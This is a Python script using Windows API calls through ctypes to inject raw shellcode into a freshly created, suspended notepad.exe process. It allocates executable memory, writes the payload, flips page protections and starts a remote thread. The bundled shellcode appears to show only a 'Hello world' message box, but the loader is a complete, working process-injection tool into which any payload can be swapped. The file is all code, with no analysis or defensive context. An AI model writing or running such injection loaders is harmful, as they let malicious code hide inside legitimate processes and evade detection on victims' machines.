from ctypes import *
from ctypes import wintypes

kernel32=windll.kernel32
LPCTSTR=c_char_p
SIZE_T=c_size_t
LPTSTR=POINTER(c_char_p)
LPBYTE=POINTER(c_ubyte)

OpenProcess = kernel32.OpenProcess # Returns the handle of a specified process
OpenProcess.argtypes=(wintypes.DWORD,wintypes.BOOL,wintypes.DWORD)
OpenProcess.restype=wintypes.HANDLE

VirtualAllocEx=kernel32.VirtualAllocEx # Locates an area in the memory
VirtualAllocEx.argtypes=(wintypes.HANDLE,wintypes.LPVOID,SIZE_T,wintypes.DWORD,wintypes.DWORD)
VirtualAllocEx.restype=wintypes.LPVOID

WriteProcessMemory=kernel32.WriteProcessMemory # Writes data to an area of memory in the specified process
WriteProcessMemory.argtypes=(wintypes.HANDLE,wintypes.LPVOID,wintypes.LPCVOID,SIZE_T,POINTER(SIZE_T))
WriteProcessMemory.restype=wintypes.BOOL


class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', wintypes.DWORD),  # Use DWORD for nLength
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL)]

SECURITY_ATTRIBUTES=_SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES=POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE=wintypes.LPVOID
CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

PAGE_READWRITE=0x04
PAGE_EXECUTE_READWRITE=0x40
MEM_COMMIT=0x00001000
MEM_RESERVE=0x00002000
EXECUTE_IMMEDIATELY=0x0
PROCESS_ALL_ACCESS=(0x000F000 | 0x00100000 | 0x00000FFF)

VirtualProtectEx=kernel32.VirtualProtectEx
VirtualProtectEx.argtypes=(wintypes.HANDLE,wintypes.LPVOID,SIZE_T,wintypes.DWORD,POINTER(wintypes.DWORD))
VirtualProtectEx.restype=wintypes.BOOL


class STARTUPINFO(Structure):
        _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", LPTSTR),
        ("lpDesktop", LPTSTR),
        ("lpTitle", LPTSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute",wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
        ]
class PROCESS_INFORMATION(Structure):
        _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
        ]

LPSTARTUPINFOA=POINTER(STARTUPINFO)
LPPROCESS_INFORMATION=POINTER(PROCESS_INFORMATION)


CreateProcessA=kernel32.CreateProcessA
CreateProcessA.argtypes=(wintypes.LPCSTR,wintypes.LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,wintypes.BOOL,wintypes.DWORD,wintypes.LPVOID,wintypes.LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION)
CreateProcessA.restype=wintypes.BOOL
buf = b"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3"


def verify(x):
    if not x:
        raise WinError()
       
startup_info=STARTUPINFO()
startup_info.cb=sizeof(startup_info)

startup_info.dwFlags=1
startup_info.wShowWindow=1

process_info=PROCESS_INFORMATION()
CREATE_NEW_CONSOLE=0x00000010
CREATE_NO_WINDOW=0x08000000
CREATE_SUSPENDED=0x00000004
create_process=CreateProcessA(b'C:\\Windows\\System32\\notepad.exe',None,None,None,False,CREATE_SUSPENDED,None,None,byref(startup_info),byref(process_info))

verify(create_process)

pid=process_info.dwProcessId
tid=process_info.dwThreadId
hp=process_info.hProcess

print(f"Process created -> PID={pid} TID={tid} HANDLE={hp}")

memory_location=VirtualAllocEx(hp,None,len(buf),MEM_RESERVE|MEM_COMMIT,PAGE_EXECUTE_READWRITE)

verify(memory_location)

print(f"Memory located at -> {hex(memory_location)}")

write=WriteProcessMemory(hp,memory_location,buf,len(buf),None)
verify(write)
print(f"Bytes written {write}")
PAGE_EXECUTE_READ=0x20
old_protect_state=wintypes.DWORD(0)
protect_state=VirtualProtectEx(hp,memory_location,len(buf),PAGE_EXECUTE_READ,byref(old_protect_state))

verify(protect_state)

print (f"Protection state changed from {old_protect_state} to {PAGE_EXECUTE_READ}")
threadid=wintypes.DWORD(0)

rthread=CreateRemoteThread(hp,None,0,memory_location,None,0x0,byref(threadid))
print(threadid)
verify(rthread)
